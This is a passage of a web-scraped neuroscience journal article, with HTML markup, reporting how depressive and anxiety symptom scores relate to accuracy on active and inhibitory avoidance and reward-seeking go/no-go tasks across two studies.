(green circles) represent the number of trials each participant required to reach the criterion of 80% correct responses within 20-trial period during acquisition. <strong>B)</strong> Interaction between anxiety scores (BAI proportion scores) and the sample group (Undergraduates vs. Online Workers) predicting trials to criterion for active avoidance. The regression lines show the relationship between anxiety scores and trials to criterion for each sample, with a stronger effect observed in undergraduates (<em>β</em> = 16.14) compared to online workers (<em>β</em> = -3.81). A significant main effect of BAI scores (<em>p</em> &lt; .01) and a significant BAI × Sample interaction (<em>p</em> &lt; .05) are indicated. Download <span><span id="DC4"><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/DC4/embed/inline-supplementary-material-4.tif?download=true" data-icon-position="" data-hide-link-title="0"><span></span>Figure 4-1, TIF file</a></span></span>.</p></div><p id="p-38"><em>Intermixed and reversal</em>. The intermixed task stage assessed participants’ ability to switch between active and inhibitory responses using discriminative cues, while the reversal task stage assessed behavioral flexibility when cue–response contingencies were reversed. A 2 × 2 within-subjects ANOVA assessing proportion correct, with Avoidance Type (active, inhibitory) and Task Stage (intermixed, reversal) as within-subjects factors, revealed a significant effect of Avoidance Type and Task Stage, and a significant interaction (<a id="xref-table-wrap-2-1" href="#T2">Table 2</a>). Follow-up analysis revealed higher accuracy on inhibitory compared with active trials in both the intermixed (<em>M</em><sub>Inhibitory</sub> = 0.90, SD = 0.06; <em>M</em><sub>Active</sub> = 0.87, SD = 0.12; <em>t</em><sub>(711)</sub> = −4.74, <em>p</em> &lt; 0.001; <a id="xref-fig-3-2" href="#F3">Fig. 3<em>B</em></a>) and reversal stages (<em>M</em><sub>Inhibitory</sub> = 0.90, SD = 0.07; <em>M</em><sub>Active</sub> = 0.82, SD = 0.15; <em>t</em><sub>(711)</sub> = −12.18, <em>p</em> &lt; 0.001; <a id="xref-fig-3-3" href="#F3">Fig. 3<em>C</em></a>). Accuracy on active trials was also higher in the intermixed compared with the reversal stage (<em>t</em><sub>(877)</sub> = 10.49, <em>p</em> &lt; 0.001), whereas inhibitory accuracy did not differ by stage (<em>t</em><sub>(877)</sub> = 0.81, <em>p</em> = 0.42).</p><div id="T2"><p><span>Table 2.</span></p><p id="p-39">Study 1—2 × 2 within-subjects ANOVA table for active and inhibitory avoidance accuracy for intermixed and reversal task stages</p></div></div><div id="sec-24"><h5>Between-subject results</h5><p id="p-41"><em>Depressive symptom scores and active avoidance accuracy</em>. To examine the relationship between depressive symptom scores and active avoidance accuracy, we used a linear mixed model with BDI-II symptom scores (<em>z</em>-normalized, grand-mean centered) as the primary predictor. The model included Sex (female, male), Task Stage (acquisition, intermixed, reversal), and Sample (undergraduates, online workers) as fixed effects and Participant as a random intercept. Proportion correct on active trials was also <em>z</em>-normalized (grand-mean centered). To ensure model stability, we adopted a simplified random-effects structure that excluded a random slope for Task Stage. As shown in <a id="xref-table-wrap-3-1" href="#T3">Table 3</a>, the model revealed a significant main effect of BDI-II (<em>β</em> = −0.230, SE = 0.074, <em>p</em> = 0.009), indicating that higher depressive symptoms were associated with lower active avoidance accuracy when all other variables were at their reference levels (i.e., female, acquisition, undergraduates). After controlling for multiple comparisons, there were no significant interactions between BDI-II and Sex or Sample. However, we observed a significant interaction between BDI-II and Task Stage, with the relationship between depressive symptoms and active avoidance accuracy changing in the intermixed (<em>β</em> = 0.300, SE = 0.083, <em>p</em> = 0.003) and reversal stages (<em>β</em> = 0.215, SE = 0.083, <em>p</em> = 0.041), relative to acquisition. These interactions suggest that the negative relationship between depressive symptoms and active avoidance accuracy was strongest during initial learning (acquisition) and was attenuated at later stages when avoidance responses are well-learned or inhibitory control was required (<a id="xref-fig-5-1" href="#F5">Fig. 5</a>).</p><div id="F5"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F5.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 1: Linear mixed model predicting active avoidance accuracy: interaction between BDI-II scores and task stage. Z-normalized depressive symptom scores (BDI-II) interacted with task stage (acquisition, intermixed, reversal) to predict active avoidance accuracy (proportion correct; z-normalized). Formula: Accuracy ∼ BDI-II × Sex × Task Stage × Sample + (1| Participant). Each circle represents individual participant data. Colored regression lines show the relationship between depressive scores and active accuracy across task stages: acquisition (green), intermixed (red), and reversal (amber). A significant negative relationship between BDI-II scores and accuracy in the acquisition stage (β = −0.230), while this relationship was attenuated in the intermixed (β = −0.015), and reversal (β = 0.070) stages. Significant BDI-II × Task Stage interactions are indicated. Asterisks next to regression lines denotes slopes significantly different from zero; asterisks between task stages indicate significant differences in the slopes between levels. Statistical significance denoted as follows: *p " rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 1: Linear mixed model predicting active avoidance accuracy: interaction between BDI-II scores and task stage. <em>Z</em>-normalized depressive symptom scores (BDI-II) interacted with task stage (acquisition, intermixed, reversal) to predict active avoidance accuracy (proportion correct; <em>z</em>-normalized). Formula: Accuracy<em> ∼ </em>BDI-II<em> × </em>Sex<em> × </em>Task Stage<em> × </em>Sample<em> + </em>(<em>1|</em> Participant). Each circle represents individual participant data. Colored regression lines show the relationship between depressive scores and active accuracy across task stages: acquisition (green), intermixed (red), and reversal (amber). A significant negative relationship between BDI-II scores and accuracy in the acquisition stage (<em>β</em> = −0.230), while this relationship was attenuated in the intermixed (<em>β</em> = −0.015), and reversal (<em>β</em> = 0.070) stages. Significant BDI-II × Task Stage interactions are indicated. Asterisks next to regression lines denotes slopes significantly different from zero; asterisks between task stages indicate significant differences in the slopes between levels. Statistical significance denoted as follows: *<em>p</em> < 0.05, **<em>p</em> < 0.01. Full model results are presented in Table 3.</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 5." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F5.medium.gif" width="440" height="435" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F5.large.jpg?download=true" title="Download Figure 5." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F5.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811669" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div><p><span>Figure 5.</span></p><p id="p-42">Study 1: Linear mixed model predicting active avoidance accuracy: interaction between BDI-II scores and task stage. <em>Z</em>-normalized depressive symptom scores (BDI-II) interacted with task stage (acquisition, intermixed, reversal) to predict active avoidance accuracy (proportion correct; <em>z</em>-normalized). Formula: Accuracy<em> ∼ </em>BDI-II<em> × </em>Sex<em> × </em>Task Stage<em> × </em>Sample<em> + </em>(<em>1|</em> Participant). Each circle represents individual participant data. Colored regression lines show the relationship between depressive scores and active accuracy across task stages: acquisition (green), intermixed (red), and reversal (amber). A significant negative relationship between BDI-II scores and accuracy in the acquisition stage (<em>β</em> = −0.230), while this relationship was attenuated in the intermixed (<em>β</em> = −0.015), and reversal (<em>β</em> = 0.070) stages. Significant BDI-II × Task Stage interactions are indicated. Asterisks next to regression lines denotes slopes significantly different from zero; asterisks between task stages indicate significant differences in the slopes between levels. Statistical significance denoted as follows: *<em>p</em> &lt; 0.05, **<em>p</em> &lt; 0.01. Full model results are presented in <a id="xref-table-wrap-3-2" href="#T3">Table 3</a>.</p></div></div><div id="T3"><p><span>Table 3.</span></p><p id="p-43">Study 1—linear mixed model for BDI-II predicting active avoidance accuracy</p></div><p id="p-51"><em>Depressive symptom scores and inhibitory avoidance accuracy.</em> A similar linear mixed model was used to examine the relationship between depressive symptom scores (BDI-II symptom scores, <em>z</em>-normalized, grand-mean centered) and inhibitory avoidance accuracy (<em>z</em>-normalized, grand-mean centered). The model included Sex (female, male), Task Stage (intermixed, reversal), and Sample (undergraduates, online workers) as fixed effects and Participant as a random intercept. No main effects or interactions involving BDI-II were significant (Extended Data <a id="xref-supplementary-material-6-2" href="#DC6">Table 3-2</a>), suggesting that depressive symptoms were not associated with inhibitory avoidance performance using this task.</p></div></div></div><div id="sec-25"><h3>Study 2 (reward-seeking/avoidance)</h3><p id="p-52">In Study 1, participants showed lower accuracy on active compared with inhibitory avoidance trials. However, it remained unclear whether this effect was driven by conflict arising from a prepotent tendency to inhibit action under threat (<a id="xref-ref-10-1" href="#ref-10">Bolles, 1970</a>; <a id="xref-ref-56-1" href="#ref-56">Pessoa, 2009</a>; <a id="xref-ref-73-1" href="#ref-73">Wendt et al., 2017</a>) or by a preference to reduce effort expenditure due to the additional demands of effortful active responses (<a id="xref-ref-36-1" href="#ref-36">Hogan et al., 2020</a>; <a id="xref-ref-30-1" href="#ref-30">Forys et al., 2023</a>). To address this, Study 2 used a mixed-motivation task that assesses both active and inhibitory responses within reward-seeking and avoidance contexts in undergraduates. Here, the design manipulated the congruency between motivational context (reward-seeking vs avoidance) and instrumental response (active vs inhibitory), allowing for analysis of how motivational context shapes action tendencies. Moreover, because the ACDM framework proposes that depression is associated with altered reward-seeking and effort-related decision-making (<a id="xref-ref-9-3" href="#ref-9">Bishop and Gagne, 2018</a>), we examined whether individual differences in depressive symptom scores would differentially affect behavior across motivational contexts. This design allowed for a detailed examination of both reward-seeking and avoidance behaviors, considering their active and inhibitory dimensions.</p><p id="p-53">We hypothesized that task accuracy would be highest for inhibitory avoidance and active reward-seeking, as these behaviors are contextually aligned with prepotent response tendencies—inhibiting action to avoid threat and initiating action to obtain reward. Furthermore, we expected that participants with higher depressive symptom scores would exhibit reduced accuracy in active reward-seeking, consistent with predictions of diminished behavioral engagement due to effort demand overestimation and/or reward undervaluation. A graphical overview of the mixed-motivation task is provided in <a id="xref-fig-6-1" href="#F6">Figure 6</a>.</p><div id="F6"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F6.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 2: Mixed-motivation go/no-go task. A, Schematic of task stages. Acquisition and intermixed. Green lines represent active (“Go”) trials, while red lines represent inhibitory (“No-Go”) trials. Light green and light red lines indicate reward-seeking (RS) trials, while dark green and dark red lines indicate avoidance trials. The black arrow indicates time progression. During acquisition, participants were required to reach a criterion of 80% correct active reward-seeking and 80% correct active avoidance trials over a 20-trial period (i.e., initial acquisition) or complete a maximum of 144 trials. Upon reaching criterion, participants completed 24 over-learning trials, followed by an unsignaled transition into the intermixed stage. In this stage, participants flexibly alternated between active and inhibitory reward-seeking and active and inhibitory avoidance responses. B, Active reward-seeking: A blue triangle signals an active reward-seeking trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period and is awarded points (+5 points) toward a monetary reward, followed with a reward-signal (white border onscreen, not shown). C, Active avoidance: A blue circle signals an active avoidance trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period, avoiding an aversive sound (yellow speaker), followed with a safety signal (white boarder onscreen, not shown). D, Inhibitory reward-seeking: A blue hexagon signals an inhibitory reward-seeking trial. The participant withholds keyboard presses for the full 1,200 ms and is awarded points toward a monetary reward, followed with a reward-signal. E, Inhibitory avoidance: A blue square signals an inhibitory avoidance trial. The participant withholds keyboard presses for the full 1,200 ms, avoiding an aversive sound, followed by a safety signal. Failed reward-seeking or avoidance trials result in no points (+0 points) or the presentation of an aversive sound, respectively." rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 2: Mixed-motivation go/no-go task. <strong><em>A</em></strong>, Schematic of task stages. Acquisition and intermixed. Green lines represent active (“Go”) trials, while red lines represent inhibitory (“No-Go”) trials. Light green and light red lines indicate reward-seeking (RS) trials, while dark green and dark red lines indicate avoidance trials. The black arrow indicates time progression. During acquisition, participants were required to reach a criterion of 80% correct active reward-seeking and 80% correct active avoidance trials over a 20-trial period (i.e., initial acquisition) or complete a maximum of 144 trials. Upon reaching criterion, participants completed 24 over-learning trials, followed by an unsignaled transition into the intermixed stage. In this stage, participants flexibly alternated between active and inhibitory reward-seeking and active and inhibitory avoidance responses. <strong><em>B</em></strong>, Active reward-seeking: A blue triangle signals an active reward-seeking trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period and is awarded points (+5 points) toward a monetary reward, followed with a reward-signal (white border onscreen, not shown). <strong><em>C</em></strong>, Active avoidance: A blue circle signals an active avoidance trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period, avoiding an aversive sound (yellow speaker), followed with a safety signal (white boarder onscreen, not shown). <strong><em>D</em></strong>, Inhibitory reward-seeking: A blue hexagon signals an inhibitory reward-seeking trial. The participant withholds keyboard presses for the full 1,200 ms and is awarded points toward a monetary reward, followed with a reward-signal. <strong><em>E</em></strong>, Inhibitory avoidance: A blue square signals an inhibitory avoidance trial. The participant withholds keyboard presses for the full 1,200 ms, avoiding an aversive sound, followed by a safety signal. Failed reward-seeking or avoidance trials result in no points (+0 points) or the presentation of an aversive sound, respectively.</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 6." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F6.medium.gif" width="440" height="236" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F6.large.jpg?download=true" title="Download Figure 6." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F6.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811684" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div><p><span>Figure 6.</span></p><p id="p-54">Study 2: Mixed-motivation go/no-go task. <strong><em>A</em></strong>, Schematic of task stages. Acquisition and intermixed. Green lines represent active (“Go”) trials, while red lines represent inhibitory (“No-Go”) trials. Light green and light red lines indicate reward-seeking (RS) trials, while dark green and dark red lines indicate avoidance trials. The black arrow indicates time progression. During acquisition, participants were required to reach a criterion of 80% correct active reward-seeking and 80% correct active avoidance trials over a 20-trial period (i.e., initial acquisition) or complete a maximum of 144 trials. Upon reaching criterion, participants completed 24 over-learning trials, followed by an unsignaled transition into the intermixed stage. In this stage, participants flexibly alternated between active and inhibitory reward-seeking and active and inhibitory avoidance responses. <strong><em>B</em></strong>, Active reward-seeking: A blue triangle signals an active reward-seeking trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period and is awarded points (+5 points) toward a monetary reward, followed with a reward-signal (white border onscreen, not shown). <strong><em>C</em></strong>, Active avoidance: A blue circle signals an active avoidance trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period, avoiding an aversive sound (yellow speaker), followed with a safety signal (white boarder onscreen, not shown). <strong><em>D</em></strong>, Inhibitory reward-seeking: A blue hexagon signals an inhibitory reward-seeking trial. The participant withholds keyboard presses for the full 1,200 ms and is awarded points toward a monetary reward, followed with a reward-signal. <strong><em>E</em></strong>, Inhibitory avoidance: A blue square signals an inhibitory avoidance trial. The participant withholds keyboard presses for the full 1,200 ms, avoiding an aversive sound, followed by a safety signal. Failed reward-seeking or avoidance trials result in no points (+0 points) or the presentation of an aversive sound, respectively.</p></div></div><div id="sec-26"><h4>Demographics</h4><p id="p-55">Females reported marginally higher levels of depressive symptoms (<em>F</em><sub>(1,328)</sub> = 3.24, <em>p</em> = 0.0729) and significantly higher levels of anxiety symptoms (<em>F</em><sub>(1,328)</sub> = 12.99, <em>p</em> &lt; 0.001) compared with males (<a id="xref-fig-7-1" href="#F7">Fig. 7<em>B</em></a>; Extended Data <a id="xref-supplementary-material-8-1" href="#DC8">Fig. 7-1</a>). There was no significant age difference between sex (<em>F</em><sub>(1,328)</sub> = 0.112, <em>p</em> = 0.738).</p><div id="F7"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F7.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 2: Distribution of depressive symptom scores in undergraduates and across sexes. Density plots representing the distribution of Beck Depression Inventory-II (BDI-II) symptom scores. A, Depressive symptom score distributions in full undergraduate sample (red). B, Depressive symptom score distributions by sex: Female (red) and Male (blue). The x-axis represents proportion scores, where raw BDI-II symptom scores, ranging from 0 to 60, have been divided by the maximum possible score (60) to produce a proportion between 0 and 1. This adjustment was made because the suicide ideation question was removed for ethical consideration. The labels on the x-axis—Minimal (0–13), Mild-Moderate (14–28), Severe (29–63)—reflect typical ranges of raw symptom scores for ease of interpretation. Dashed vertical black line represents mean in full sample. Dash vertical-colored lines represent the mean BDI-II symptom score for each group. In panel B, a marginal significant difference in depressive levels between sexes is indicated (p " rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 2: Distribution of depressive symptom scores in undergraduates and across sexes. Density plots representing the distribution of Beck Depression Inventory-II (BDI-II) symptom scores. <strong><em>A</em></strong>, Depressive symptom score distributions in full undergraduate sample (red). <strong><em>B</em></strong>, Depressive symptom score distributions by sex: Female (red) and Male (blue). The <em>x</em>-axis represents proportion scores, where raw BDI-II symptom scores, ranging from 0 to 60, have been divided by the maximum possible score (60) to produce a proportion between 0 and 1. This adjustment was made because the suicide ideation question was removed for ethical consideration. The labels on the <em>x</em>-axis—Minimal (0–13), Mild-Moderate (14–28), Severe (29–63)—reflect typical ranges of raw symptom scores for ease of interpretation. Dashed vertical black line represents mean in full sample. Dash vertical-colored lines represent the mean BDI-II symptom score for each group. In panel <strong><em>B</em></strong>, a marginal significant difference in depressive levels between sexes is indicated (<em>p</em> < 0.10), with females scoring higher on average than males. See Extended Data Figures 7-1 (BAI distributions) and 7-2 (Age distribution).</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 7." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F7.medium.gif" width="440" height="226" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F7.large.jpg?download=true" title="Download Figure 7." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F7.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811674" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div><p><span>Figure 7.</span></p><p id="p-56">Study 2: Distribution of depressive symptom scores in undergraduates and across sexes. Density plots representing the distribution of Beck Depression Inventory-II (BDI-II) symptom scores. <strong><em>A</em></strong>, Depressive symptom score distributions in full undergraduate sample (red). <strong><em>B</em></strong>, Depressive symptom score distributions by sex: Female (red) and Male (blue). The <em>x</em>-axis represents proportion scores, where raw BDI-II symptom scores, ranging from 0 to 60, have been divided by the maximum possible score (60) to produce a proportion between 0 and 1. This adjustment was made because the suicide ideation question was removed for ethical consideration. The labels on the <em>x</em>-axis—Minimal (0–13), Mild-Moderate (14–28), Severe (29–63)—reflect typical ranges of raw symptom scores for ease of interpretation. Dashed vertical black line represents mean in full sample. Dash vertical-colored lines represent the mean BDI-II symptom score for each group. In panel <strong><em>B</em></strong>, a marginal significant difference in depressive levels between sexes is indicated (<em>p</em> &lt; 0.10), with females scoring higher on average than males. See Extended Data <a id="xref-supplementary-material-8-2" href="#DC8">Figures 7-1</a> (BAI distributions) and <a id="xref-supplementary-material-9-1" href="#DC9">7-2</a> (Age distribution).</p></div></div><div id="DC8"><h3>Figure 7-1</h3><p id="p-57"><strong>Study 2: Distribution of Anxiety Scores in Undergraduates and Across Sexes.</strong> Density plots representing the distribution of Beck Anxiety Inventory (BAI) scores. <strong>A)</strong> Anxiety score distributions in full undergraduate sample (red). <strong>B)</strong> Anxiety score distributions by sex: Female (red) and Male (blue). The x-axis represents proportion scores, where raw BAI scores, ranging from 0-63, have been divided by the maximum possible score (63) to produce a proportion between 0 and 1. This adjustment was made for comparability between the BDI-II and BAI scales. The labels on the x-axis -- Minimal (0-7), Mild-Moderate (8-25), Severe (26-63) -- reflect typical ranges of raw scores for ease of interpretation. Dashed vertical black line represents mean in full sample. Dashed vertical-coloured lines represent the mean BAI score for each sex. In panel B, a significant difference in anxiety levels between sexes is indicated (<em>p</em> &lt; .001), with females scoring higher on average than males. Download <span><span id="DC8"><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/DC8/embed/inline-supplementary-material-8.tif?download=true" data-icon-position="" data-hide-link-title="0"><span></span>Figure 7-1, TIF file</a></span></span>.</p></div><div id="DC9"><h3>Figure 7-2</h3><p id="p-58"><strong>Study 2: Age Distribution in Undergraduates.</strong> Density plot representing the distribution of ages for undergraduates (red). Dashed vertical black line represent the mean age. Download <span><span id="DC9"><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/DC9/embed/inline-supplementary-material-9.tif?download=true" data-icon-position="" data-hide-link-title="0"><span></span>Figure 7-2, TIF file</a></span></span>.</p></div></div><div id="sec-27"><h4>Mixed-motivation go/no-go task</h4><div id="sec-28"><h5>Acquisition</h5><p id="p-59">Participants successfully learned both active reward-seeking and avoidance responses, as indicated by the number of trials to criterion (reward-seeking: <em>M</em> = 46.94, SD = 18.09; avoidance: <em>M</em> = 51.72, SD = 19.90). A one-way within-subjects ANOVA revealed a significant effect of Motivational Context on the number of trials to criterion, with more trials needed to acquire active avoidance than reward-seeking (<em>F</em><sub>(1,329)</sub> = 30.96, <em>p</em> &lt; 0.001; <a id="xref-fig-8-1" href="#F8">Fig. 8<em>A</em></a>). To test whether depressive symptoms predicted trials to criterion, we fit a linear mixed model including BDI-II scores, Sex, and Motivational Context. No main or interaction effect of BDI-II was observed. Motivational context significantly affected acquisition accuracy, with lower proportion correct on active avoidance (<em>M</em> = 0.774, SD = 0.135) compared with active reward-seeking (<em>M</em> = 0.819, SD = 0.137; <em>F</em><sub>(1,329)</sub> = 52.59, <em>p</em> &lt; 0.001; <a id="xref-fig-8-2" href="#F8">Fig. 8<em>B</em></a>). To assess how this difference varied over time, we analyzed accuracy across the first six trial blocks (where all participants had data). Accuracy improved across blocks (main effect of block) and remained higher for reward-seeking trials compared with avoidance trials (main effect of Motivational Context; <a id="xref-table-wrap-4-1" href="#T4">Table 4</a>). While this difference persisted across blocks 1–5 (<em>t</em>'s<sub>(1629)</sub> &gt; 2.56, <em>p</em>'s &lt; 0.01), it converged by block 6 (<em>t</em><sub>(1,629)</sub> = 1.59, <em>p</em> = 0.11; <a id="xref-fig-8-3" href="#F8">Fig. 8<em>C</em></a>), suggesting slower acquisition for active avoidance than reward-seeking.</p><div id="F8"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F8.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 2: Performance comparison between active reward-seeking and active avoidance during the acquisition stage. A, Number of trials required to reach criterion for all participants in the mixed-motivation task. Individual data points (light green triangles for Active Reward-Seeking; dark green circles for Active Avoidance) represent the number of trials each participant required to reach the criterion of 80% correct responses within 20-trial period during acquisition. B, Overall accuracy for active reward-seeking and active avoidance in the acquisition stage. Individual data points (light green triangles for Active Reward-Seeking; dark green circles for Active Avoidance) represent the proportion correct for each participant. Proportion correct reflects the ratio of successful active responses relative to the total number of trials within each motivation type. C, Accuracy for active reward-seeking and active avoidance across blocks of six trials, with triangles and circles representing mean performance for reward-seeking and avoidance trials, respectively. Significant differences between active reward-seeking and active avoidance during the acquisition stage are indicated (p " rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 2: Performance comparison between active reward-seeking and active avoidance during the acquisition stage. <strong><em>A</em></strong>, Number of trials required to reach criterion for all participants in the mixed-motivation task. Individual data points (light green triangles for Active Reward-Seeking; dark green circles for Active Avoidance) represent the number of trials each participant required to reach the criterion of 80% correct responses within 20-trial period during acquisition. <strong><em>B</em></strong>, Overall accuracy for active reward-seeking and active avoidance in the acquisition stage. Individual data points (light green triangles for Active Reward-Seeking; dark green circles for Active Avoidance) represent the proportion correct for each participant. Proportion correct reflects the ratio of successful active responses relative to the total number of trials within each motivation type. <strong><em>C</em></strong>, Accuracy for active reward-seeking and active avoidance across blocks of six trials, with triangles and circles representing mean performance for reward-seeking and avoidance trials, respectively. Significant differences between active reward-seeking and active avoidance during the acquisition stage are indicated (<em>p</em> < 0.001).</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 8." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F8.medium.gif" width="440" height="303" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F8.large.jpg?download=true" title="Download Figure 8." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F8.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811665" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div><p><span>Figure 8.</span></p><p id="p-60">Study 2: Performance comparison between active reward-seeking and active avoidance during the acquisition stage. <strong><em>A</em></strong>, Number of trials required to reach criterion for all participants in the mixed-motivation task. Individual data points (light green triangles for Active Reward-Seeking; dark green circles for Active Avoidance) represent the number of trials each participant required to reach the criterion of 80% correct responses within 20-trial period during acquisition. <strong><em>B</em></strong>, Overall accuracy for active reward-seeking and active avoidance in the acquisition stage. Individual data points (light green triangles for Active Reward-Seeking; dark green circles for Active Avoidance) represent the proportion correct for each participant. Proportion correct reflects the ratio of successful active responses relative to the total number of trials within each motivation type. <strong><em>C</em></strong>, Accuracy for active reward-seeking and active avoidance across blocks of six trials, with triangles and circles representing mean performance for reward-seeking and avoidance trials, respectively. Significant differences between active reward-seeking and active avoidance during the acquisition stage are indicated (<em>p</em> &lt; 0.001).</p></div></div><div id="T4"><p><span>Table 4.</span></p><p id="p-61">Study 2—2 × 6 within-subjects ANOVA for active response accuracy for acquisition task stage by block</p></div></div><div id="sec-29"><h5>Intermixed</h5><p id="p-64">The intermixed stage assessed participants’ ability to flexibly select actions or inhibit responses based on motivational contexts (i.e., reward-seeking vs avoidance). A 2 × 2 within-subjects ANOVA (Motivational Context × Response Type) revealed a significant main effect of Response Type and a significant interaction but no main effect of Motivational Context (<a id="xref-table-wrap-5-1" href="#T5">Table 5</a>). Follow-up analysis revealed higher accuracy for active reward-seeking than active avoidance (<em>t</em><sub>(658)</sub> = 9.92, <em>p</em> &lt; 0.0001) and higher accuracy for inhibitory avoidance compared with inhibitory reward-seeking (<em>t</em><sub>(658)</sub> = 9.60, <em>p</em> &lt; 0.0001). In the avoidance context, inhibitory responses were more accurate compared with active responses (<em>t</em><sub>(658)</sub> = 10.73, <em>p</em> &lt; 0.0001), consistent with Study 1. There were no accuracy differences in Response Type in the reward-seeking context (<em>t</em><sub>(498)</sub> = 1.95, <em>p</em> = 0.21; <a id="xref-fig-9-1" href="#F9">Fig. 9</a>).</p><div id="F9"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F9.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 2: Performance comparison between reward-seeking and avoidance for active and inhibitory responses during the intermixed stage. A, Overall accuracy for active/inhibitory reward-seeking and avoidance in the intermixed stage. Individual data points (light green triangles for Active Reward-Seeking; light red triangles for Inhibitory Reward-Seeking, dark green circles for Active Avoidance, dark red circles for Inhibitory Avoidance) represent the proportion correct for each participant. Proportion correct reflects the ratio of successful responses relative to the total number of trials within each trial type. B, Accuracy for active/inhibitory reward-seeking and avoidance across blocks of six trials during the intermixed task stage. Shapes represent mean performance for each trial type across 10 blocks. Significant differences between (1) active reward-seeking and active avoidance, (2) inhibitory reward-seeking and inhibitory avoidance, and (3) active and inhibitory avoidance are indicated (p " rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 2: Performance comparison between reward-seeking and avoidance for active and inhibitory responses during the intermixed stage. <strong><em>A</em></strong>, Overall accuracy for active/inhibitory reward-seeking and avoidance in the intermixed stage. Individual data points (light green triangles for Active Reward-Seeking; light red triangles for Inhibitory Reward-Seeking, dark green circles for Active Avoidance, dark red circles for Inhibitory Avoidance) represent the proportion correct for each participant. Proportion correct reflects the ratio of successful responses relative to the total number of trials within each trial type. <strong><em>B</em></strong>, Accuracy for active/inhibitory reward-seeking and avoidance across blocks of six trials during the intermixed task stage. Shapes represent mean performance for each trial type across 10 blocks. Significant differences between (1) active reward-seeking and active avoidance, (2) inhibitory reward-seeking and inhibitory avoidance, and (3) active and inhibitory avoidance are indicated (<em>p</em> < 0.001).</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 9." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F9.medium.gif" width="440" height="319" 